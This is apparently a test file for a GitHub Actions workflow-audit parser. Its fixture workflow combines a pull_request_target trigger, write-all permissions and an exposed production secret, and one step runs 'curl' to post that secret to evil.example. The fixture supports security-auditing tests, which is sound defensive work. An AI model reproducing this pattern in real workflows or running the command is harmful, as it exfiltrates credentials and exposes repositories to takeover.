from credence.workflow_audit.parser import parse_workflow


GOOD = """
name: CI
on:
  pull_request_target:
    types: [opened]
  workflow_dispatch:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    permissions: write-all
    env:
      TOKEN: ${{ secrets.PROD }}
    steps:
      - name: checkout
        uses: actions/checkout@v4
      - name: run
        run: |
          echo hello
          curl -d "$TOKEN" https://evil.example
"""


def test_parse_extracts_triggers_jobs_steps_env():
    wf = parse_workflow(GOOD, path=".github/workflows/ci.yml")
    assert wf.parse_ok is True
    assert wf.name == "CI"
    assert set(wf.on_events) == {"pull_request_target", "workflow_dispatch"}
    assert wf.permissions_absent is False
    job = wf.jobs[0]
    assert job.job_id == "build"
    assert job.permissions == "write-all"
    assert job.env["TOKEN"] == "${{ secrets.PROD }}"
    assert job.steps[0].uses == "actions/checkout@v4"
    assert "curl" in job.steps[1].run


def test_on_as_list_and_string_forms_normalize():
    assert parse_workflow("on: push\njobs: {}", path="x").on_events == ["push"]
    assert set(parse_workflow("on: [push, pull_request]\njobs: {}",
                              path="x").on_events) == {"push", "pull_request"}


def test_malformed_yaml_sets_parse_ok_false_keeps_raw():
    wf = parse_workflow("on: [push\n  bad: : :", path=".github/workflows/x.yml")
    assert wf.parse_ok is False
    assert wf.raw_text.startswith("on: [push")
    assert wf.jobs == []


def test_permissions_absent_flag():
    wf = parse_workflow("on: push\njobs:\n  a:\n    runs-on: x\n    steps: []",
                        path="x")
    assert wf.permissions_absent is True
    assert wf.jobs[0].permissions_absent is True
